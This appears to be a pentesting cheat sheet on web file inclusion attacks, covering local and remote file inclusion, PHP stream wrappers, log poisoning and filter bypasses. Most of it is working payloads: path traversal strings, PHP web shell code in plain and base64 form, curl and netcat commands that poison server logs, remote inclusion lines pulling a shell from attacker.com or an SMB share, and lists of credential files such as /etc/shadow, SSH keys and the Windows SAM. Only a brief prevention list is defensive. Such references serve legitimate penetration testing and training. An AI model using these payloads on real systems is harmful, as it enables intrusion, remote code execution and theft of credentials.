---
title: File Inclusion Attacks
category: web-attacks
tags:
  - lfi
  - rfi
  - path-traversal
  - php-wrappers
  - log-poisoning
  - web-exploitation
last_updated: 2025-12-27
---

# File Inclusion Attacks

File inclusion vulnerabilities occur when an application dynamically includes files based on user-supplied input without proper validation. These vulnerabilities can lead to sensitive data disclosure, code execution, and full system compromise.

## Table of Contents

- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [PHP Wrapper Techniques](#php-wrapper-techniques)
- [Log Poisoning](#log-poisoning)
- [Windows vs Linux Paths](#windows-vs-linux-paths)
- [Common Files to Target](#common-files-to-target)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Tools and Automation](#tools-and-automation)

---

## Local File Inclusion (LFI)

Local File Inclusion allows an attacker to include files that are already present on the target server. This typically occurs in PHP applications but can affect any language that includes files dynamically.

### Basic LFI Detection

```bash
# Vulnerable parameter patterns
?page=home
?file=content.php
?template=default
?include=header
?path=../../etc/passwd
?doc=terms.html
```

### Path Traversal Techniques

Path traversal (directory traversal) allows escaping the web root to access arbitrary files on the filesystem.

```bash
# Basic traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Deep traversal (when depth is unknown)
../../../../../../../../../../../../../etc/passwd

# URL encoded variants
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Using backslashes (Windows and sometimes Linux)
..\..\..\etc\passwd
..\\..\\..\\etc\\passwd

# Mixed slashes
..\/..\/..\/etc/passwd
../.\../.\../etc/passwd
```

### Null Byte Injection

Null byte injection terminates the string early, bypassing extension restrictions. This works on PHP < 5.3.4.

```bash
# Bypass .php extension appending
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd\x00

# URL encoded null byte
../../../etc/passwd%2500

# With extension bypass
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

### Path Truncation

On older systems, paths are truncated at certain lengths (4096 bytes on Linux, 256 on Windows).

```bash
# Linux path truncation
../../../etc/passwd/./././././././[... repeat until 4096+ chars ...]

# Automated truncation payload
../../../etc/passwd$(python -c "print('/./' * 2048)")

# Windows path truncation
..\..\..\..\windows\system32\config\sam\.\.\.\.\.\.\.[\... repeat ...]
```

---

## PHP Wrapper Techniques

PHP provides several stream wrappers that can be abused for LFI exploitation.

### php://filter - Read Source Code

The `php://filter` wrapper allows reading file contents, including PHP source code in base64.

```bash
# Read PHP source code (base64 encoded)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php

# Read without base64 (may execute PHP)
php://filter/resource=index.php

# Chain multiple filters
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# Filter chain for RCE (requires specific conditions)
php://filter/convert.base64-decode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**Decoding the output:**
```bash
echo "base64_output_here" | base64 -d
```

### php://input - POST Data as File

Requires `allow_url_include=On`.

```bash
# Request
POST /vulnerable.php?page=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

```bash
# Using curl
curl -X POST "http://target.com/vulnerable.php?page=php://input" \
     --data "<?php system('id'); ?>"
```

### data:// Wrapper

Requires `allow_url_include=On`.

```bash
# Basic PHP execution
data://text/plain,<?php system('id'); ?>

# Base64 encoded payload
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# With command parameter
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id

# URL encoded
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2b
```

### expect:// Wrapper

Requires `expect` extension (rarely enabled).

```bash
# Execute system commands directly
expect://id
expect://whoami
expect://cat /etc/passwd
```

### zip:// Wrapper

For including files from ZIP archives.

```bash
# Create malicious ZIP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip payload.zip shell.php

# Upload as allowed file type
mv payload.zip payload.jpg

# Include via zip wrapper
zip://uploads/payload.jpg%23shell.php
zip://uploads/payload.jpg#shell.php
```

### phar:// Wrapper

For including files from PHAR archives, can be used for deserialization attacks.

```bash
# Create malicious PHAR
# (requires PHP script to generate)

# Include via phar wrapper
phar://uploads/payload.jpg/shell.php
phar:///var/www/uploads/evil.phar
```

---

## Log Poisoning

Log poisoning involves injecting PHP code into log files, then including those logs via LFI to achieve RCE.

### Apache Access Log Poisoning

```bash
# Common Apache log locations
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/httpd-access.log
/usr/local/apache/log/access_log
/usr/local/apache2/log/access_log

# Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Or using netcat
echo "GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: <?php system(\$_GET['cmd']); ?>\r\n\r\n" | nc target.com 80

# Trigger via LFI
curl "http://target.com/vulnerable.php?page=../../../var/log/apache2/access.log&cmd=id"
```

### Apache Error Log Poisoning

```bash
# Common error log locations
/var/log/apache2/error.log
/var/log/apache/error.log
/var/log/httpd/error_log

# Trigger an error with PHP payload in the URL
curl "http://target.com/<?php system(\$_GET['cmd']); ?>"

# Include error log
curl "http://target.com/vulnerable.php?page=../../../var/log/apache2/error.log&cmd=id"
```

### Nginx Log Poisoning

```bash
# Nginx log locations
/var/log/nginx/access.log
/var/log/nginx/error.log

# Poison via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

### SSH Log Poisoning

```bash
# SSH log location
/var/log/auth.log
/var/log/secure

# Inject via username (will appear in logs)
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include auth.log via LFI
```

### Mail Log Poisoning

```bash
# Mail log locations
/var/log/mail.log
/var/log/maillog
/var/spool/mail/www-data

# Send email with PHP payload
sendmail -t www-data < payload_email.txt

# Or via SMTP
telnet target.com 25
MAIL FROM:<attacker@evil.com>
RCPT TO:<www-data>
DATA
<?php system($_GET['cmd']); ?>
.
QUIT
```

### /proc/self/environ

The environ file contains environment variables, including User-Agent in some configurations.

```bash
# Check if readable
curl "http://target.com/vulnerable.php?page=../../../proc/self/environ"

# Inject PHP via User-Agent
curl -A "<?php system('id'); ?>" \
     "http://target.com/vulnerable.php?page=../../../proc/self/environ"
```

### /proc/self/fd/X (File Descriptors)

```bash
# Enumerate file descriptors
for i in $(seq 0 50); do
    curl "http://target.com/vulnerable.php?page=../../../proc/self/fd/$i" 2>/dev/null | grep -q "root" && echo "Found: fd/$i"
done
```

---

## Remote File Inclusion (RFI)

Remote File Inclusion allows including files from external servers.

### Requirements

RFI requires these PHP settings to be enabled:
```ini
allow_url_fopen = On   # Usually enabled by default
allow_url_include = On # Usually disabled by default
```

### Basic RFI Exploitation

```bash
# Host a PHP shell on your server
echo '<?php system($_GET["cmd"]); ?>' > shell.txt

# Start web server
python3 -m http.server 80

# Exploit RFI
curl "http://target.com/vulnerable.php?page=http://attacker.com/shell.txt&cmd=id"

# Using different protocols
?page=http://attacker.com/shell.txt
?page=https://attacker.com/shell.txt
?page=ftp://attacker.com/shell.txt
```

### RFI with SMB (Windows)

```bash
# Start SMB server
impacket-smbserver share /path/to/shells -smb2support

# Exploit
?page=\\attacker_ip\share\shell.php
?page=//attacker_ip/share/shell.php
```

### Bypassing Extension Filters

```bash
# Null byte (PHP < 5.3.4)
?page=http://attacker.com/shell.txt%00

# Query string to ignore appended extension
?page=http://attacker.com/shell.txt?

# Fragment to ignore appended extension
?page=http://attacker.com/shell.txt#
```

---

## Windows vs Linux Paths

### Linux Common Paths

```bash
# System files
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config

# Process information
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/[0-9]*
/proc/version
/proc/net/tcp
/proc/net/udp
/proc/sched_debug

# User files
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
```

### Windows Common Paths

```bash
# System files
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts

# IIS configuration
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\inetsrv\config\applicationHost.config

# User files
C:\Users\[user]\Desktop\
C:\Users\[user]\Documents\
C:\Users\Administrator\.ssh\id_rsa

# Traversal syntax
..\..\..\..\Windows\System32\config\SAM
....//....//....//Windows/System32/config/SAM
```

---

## Common Files to Target

### Web Application Configuration

```bash
# PHP
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php
/var/www/html/.env
/var/www/html/config/database.php

# Apache
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/.htpasswd
/etc/httpd/conf/httpd.conf

# Nginx
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default

# Database
/var/lib/mysql/mysql/user.MYD
/var/lib/postgresql/data/pg_hba.conf
```

### Sensitive System Files

```bash
# Linux credentials
/etc/passwd
/etc/shadow
/etc/master.passwd
/etc/group

# SSH keys
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/home/*/.ssh/id_rsa

# History files
/root/.bash_history
/home/*/.bash_history
/root/.mysql_history
```

### Windows Sensitive Files

```bash
# SAM database (password hashes)
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

# Unattended installation files
C:\unattend.xml
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\system32\sysprep\Unattend.xml

# IIS
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config

# Group Policy
C:\Windows\SYSVOL\domain\Policies\
```

---

## Filter Bypass Techniques

### Path Normalization Bypass

```bash
# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Overlong UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Path traversal with nested sequences
....//....//....//etc/passwd
..../\..../\..../\etc/passwd
....\/....\/....\/etc/passwd

# URL encoding variations
%2e%2e%2f       # ../
%2e%2e/         # ../
..%2f           # ../
%2e%2e%5c       # ..\
```

### Extension Bypass

```bash
# Null byte (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php

# Double extensions
../../../etc/passwd.php.jpg
../../../etc/passwd%00.jpg

# Alternate encodings
../../../etc/passwd%0a
../../../etc/passwd%0d
```

### WAF Bypass Techniques

```bash
# Case variations (Windows)
..\..\..\..\WINDOWS\system32\config\SAM

# Using environment variables
$HOME/../../../etc/passwd

# Obfuscated paths
/etc/./passwd
/etc/../etc/passwd
/etc/passwd/.

# Non-standard encodings
%c0%ae%c0%ae%c0%af  # ../
%uff0e%uff0e%u2215  # Unicode encoding
```

---

## Tools and Automation

### LFISuite

```bash
# Install
git clone https://github.com/D35m0nd142/LFISuite.git

# Run
python3 lfisuite.py
```

### Kadimus

```bash
# LFI exploitation tool
kadimus -u "http://target.com/page.php?file=" -A "User-Agent: <?php system('id'); ?>"
```

### fimap

```bash
# Automatic LFI scanner
fimap -u "http://target.com/page.php?file=test"
```

### Manual Testing with ffuf

```bash
# Fuzz for LFI
ffuf -u "http://target.com/page.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

# Fuzz for valid files
ffuf -u "http://target.com/page.php?file=../../../FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-list.txt
```

### Wordlists

```bash
# SecLists LFI wordlists
/usr/share/seclists/Fuzzing/LFI/
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
```

---

## Prevention and Remediation

1. **Input Validation**: Whitelist allowed files/paths
2. **Avoid Dynamic Includes**: Use static includes where possible
3. **Disable URL Includes**: Set `allow_url_include=Off`
4. **Chroot Jails**: Restrict web server access
5. **File Permissions**: Limit readable files
6. **WAF Rules**: Block common LFI patterns
7. **Update Software**: Keep PHP and web servers patched

---

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks - File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
